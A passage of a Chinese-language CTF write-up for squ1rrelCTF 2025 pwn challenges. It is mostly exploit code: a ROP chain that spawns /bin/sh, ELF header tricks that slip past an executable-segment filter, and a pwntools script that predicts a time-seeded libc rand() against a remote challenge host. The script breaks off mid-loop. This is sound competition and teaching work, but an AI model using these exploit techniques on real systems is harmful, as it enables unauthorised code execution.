<span class="nf">sl</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">rl</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">name: </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x4cb3c3</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x42DAA0</span><span class="p">))</span>
<span class="n">pay</span><span class="o">=</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x6</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x4cb3c3</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>


<span class="nf">inter</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h2 id="pwn-extremely-lame-filters-1"><span class="me-2">pwn-Extremely Lame Filters 1</span><a href="#pwn-extremely-lame-filters-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>代码只是判断 section里的flags信息，决定flags有执行权限的信息是在 elf 头</li>
</ul>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="n">elf</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>

<span class="c1">#data = b64decode(input("I'm a little fairy and I will trust any ELF that comes by!!"))
</span>


<span class="n">data</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./xxx_shell</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nf">parse</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="c1">#print(elf.sections)
</span>
<span class="k">for</span> <span class="n">section</span> <span class="ow">in</span> <span class="n">elf</span><span class="p">.</span><span class="n">sections</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">section</span><span class="p">.</span><span class="n">sh_flags</span> <span class="o">&amp;</span> <span class="n">SectionFlags</span><span class="p">.</span><span class="n">EXECINSTR</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">section</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">section</span><span class="p">.</span><span class="n">sh_flags</span> <span class="o">&amp;</span> <span class="n">SectionFlags</span><span class="p">.</span><span class="n">EXECINSTR</span><span class="p">:</span>
       <span class="k">raise</span> <span class="nc">ValidationException</span><span class="p">(</span><span class="sh">"</span><span class="s">!!</span><span class="sh">"</span><span class="p">)</span>

<span class="c1">#elf.run()
</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>section 段在 正常的 elf 文件最后面 这里原本 是 0x06 把他改了 只要没有执行就行</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406214927-nu9k41h.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406214927-nu9k41h.png" alt="image" loading="lazy"></a></p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="pwn-extremely-lame-filters-2"><span class="me-2">pwn-Extremely Lame Filters 2</span><a href="#pwn-extremely-lame-filters-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="n">elf</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>

<span class="n">data</span> <span class="o">=</span> <span class="nf">b64decode</span><span class="p">(</span><span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">I</span><span class="sh">'</span><span class="s">m a little fairy and I will trust any ELF that comes by!! (almost any)</span><span class="sh">"</span><span class="p">))</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nf">parse</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">if</span> <span class="n">elf</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">e_type</span> <span class="o">!=</span> <span class="n">constants</span><span class="p">.</span><span class="n">ET_EXEC</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">!!</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">for</span> <span class="n">segment</span> <span class="ow">in</span> <span class="n">elf</span><span class="p">.</span><span class="n">segments</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">segment</span><span class="p">.</span><span class="n">p_flags</span> <span class="o">&amp;</span> <span class="n">SegmentFlags</span><span class="p">.</span><span class="n">X</span><span class="p">:</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">content</span><span class="p">(</span><span class="n">segment</span><span class="p">)</span> <span class="c1"># elf.content
</span>        <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">byte</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;:(</span><span class="sh">"</span><span class="p">)</span>
                <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">elf</span><span class="p">.</span><span class="nf">run</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>控制 p_filesz 就可以 减少 content 获取字节的数量</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/c783b0270c1d02c694ecb60bbb9daa45-20250406212916-oqu46je.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/c783b0270c1d02c694ecb60bbb9daa45-20250406212916-oqu46je.png" alt="c783b0270c1d02c694ecb60bbb9daa45" loading="lazy"></a></p>

<p>‍</p>

<p>‍</p>

<p>在这里修改，可执行段的大小，最小改成1</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/e6bd3b449d7ea60ad92b1101e874912f-20250406212930-piadv5o.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/e6bd3b449d7ea60ad92b1101e874912f-20250406212930-piadv5o.png" alt="e6bd3b449d7ea60ad92b1101e874912f" loading="lazy"></a></p>

<p>‍</p>

<p>第一个字节是00就行了</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/9bd730a8a8f1c411d2db70f713a3038d-20250406212946-sf7sr8u.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/9bd730a8a8f1c411d2db70f713a3038d-20250406212946-sf7sr8u.png" alt="9bd730a8a8f1c411d2db70f713a3038d" loading="lazy"></a></p>

<p>‍</p>

<p>修改之后，仍然可以有全部数据</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406213547-0weaupw.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406213547-0weaupw.png" alt="image" loading="lazy"></a></p>

<p>‍</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="n">elf</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>

<span class="c1">#data = b64decode(input("I'm a little fairy and I will trust any ELF that comes by!! (almost any)"))
</span>
<span class="c1">#data = open('./shell_elf','rb').read()
</span><span class="n">data</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./fix_pwn</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nf">parse</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">e_type</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">constants</span><span class="p">.</span><span class="n">ET_EXEC</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">ok.</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># SegmentFlags.R: 该段是可读的（Readable）。
# SegmentFlags.W: 该段是可写的（Writable）。
# SegmentFlags.X: 该段是可执行的（Executable）。
</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">SegmentFlags.X</span><span class="sh">'</span><span class="p">,</span><span class="n">SegmentFlags</span><span class="p">.</span><span class="n">X</span><span class="p">)</span>
<span class="k">for</span> <span class="n">segment</span> <span class="ow">in</span> <span class="n">elf</span><span class="p">.</span><span class="n">segments</span><span class="p">:</span>
    <span class="c1">#print(segment.p_flags &amp; SegmentFlags.X)
</span>    <span class="k">if</span> <span class="n">segment</span><span class="p">.</span><span class="n">p_flags</span> <span class="o">&amp;</span> <span class="n">SegmentFlags</span><span class="p">.</span><span class="n">X</span><span class="p">:</span>
        <span class="c1">#content = elf.content(segment)
</span>        <span class="n">content</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">content</span><span class="p">(</span><span class="n">segment</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">segment</span><span class="p">.</span><span class="n">p_offset</span> <span class="p">,</span> <span class="n">segment</span><span class="p">.</span><span class="n">p_filesz</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="squ1rrel-casino-附件更新"><span class="me-2">squ1rrel-casino （附件更新）</span><a href="#squ1rrel-casino-附件更新" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<p>简单了，直接秒</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/77711435371ffdd18d494cf48d66d6b4-20250406115804-8nzhx3h.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/77711435371ffdd18d494cf48d66d6b4-20250406115804-8nzhx3h.png" alt="77711435371ffdd18d494cf48d66d6b4" loading="lazy"></a></p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="n">CDLL</span>
<span class="n">cdl</span> <span class="o">=</span> <span class="nc">CDLL</span><span class="p">(</span><span class="sh">'</span><span class="s">/lib/x86_64-linux-gnu/libc.so.6</span><span class="sh">'</span><span class="p">)</span>
<span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>  <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">lss</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s -&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>

<span class="n">attack</span> <span class="o">=</span> <span class="sh">'</span><span class="s">20.84.72.194 5004</span><span class="sh">'</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./casino</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span><span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">attack</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="c1">#context(log_level = 'debug')
</span><span class="nf">context</span><span class="p">(</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">,</span>
<span class="n">terminal</span><span class="o">=</span><span class="sh">'</span><span class="s">tmux splitw -h -l 170</span><span class="sh">'</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">.</span><span class="n">libc</span>
<span class="c1">#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')
#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
brva 0x1104
brva 0x1040
#brva 0x0179A
#brva 0x01667
#brva 0x179A
#brva 0x01DC7
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>
<span class="c1">#import os
#os.systimport os
#io = remote(*attack.split(':'))
</span>


<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>

<span class="n">name_list</span> <span class="o">=</span> <span class="p">[</span>
        <span class="nf">p64</span><span class="p">(</span><span class="mh">0x29312820656341</span><span class="p">)</span>
        <span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x293228206F7754</span><span class="p">)</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Three (3)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Four (4)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Five (5)</span><span class="sh">"</span>
        <span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x29362820786953</span><span class="p">)</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Seven (7)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Eight (8)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Nine (9)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Ten (10)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Jack (10)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Queen (10)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">King (10)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Joker (10)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Special (10)</span><span class="sh">"</span>
        <span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x6E776F6E6B6E55</span><span class="p">)</span>
        <span class="p">]</span>

<span class="k">def</span> <span class="nf">get_card_name</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">name_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">draw_card</span><span class="p">():</span>
    <span class="nf">return </span><span class="p">(</span><span class="n">cdl</span><span class="p">.</span><span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">15</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">play</span><span class="p">():</span>
    <span class="nf">draw_card</span><span class="p">()</span>
    <span class="nf">draw_card</span><span class="p">()</span>
    <span class="nf">draw_card</span><span class="p">()</span>
    <span class="nf">draw_card</span><span class="p">()</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">view</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Choose an option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Choose an option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s"> replace? </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">view_card</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Choose an option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s"> view? </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Card #</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">(</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">(</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">d</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">)</span><span class="sh">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">d</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">return</span> <span class="n">d</span>

<span class="k">def</span> <span class="nf">stand</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Choose an option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">bk</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Choose an option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>




<span class="k">def</span> <span class="nf">edit_4bit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">n</span><span class="p">):</span>
    <span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
        <span class="nf">play</span><span class="p">()</span>
        <span class="n">c</span> <span class="o">=</span> <span class="nf">draw_card</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="p">(</span><span class="n">n</span><span class="o">&gt;&gt;</span><span class="mi">4</span><span class="p">):</span>
            <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="o">+</span><span class="mi">1</span><span class="o">-</span><span class="p">(</span><span class="n">n</span><span class="o">&amp;</span><span class="mh">0xF</span><span class="p">))</span>
            <span class="nf">ls</span><span class="p">(</span><span class="sh">"</span><span class="s">find !!!!</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="nf">bk</span><span class="p">()</span>


<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>
<span class="n">cdl</span><span class="p">.</span><span class="nf">srand</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()))</span>

<span class="n">name</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x3f</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Enter your name: </span><span class="sh">"</span><span class="p">)</span>
<span class="nf">s</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="nf">play</span><span class="p">()</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">elf_base</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
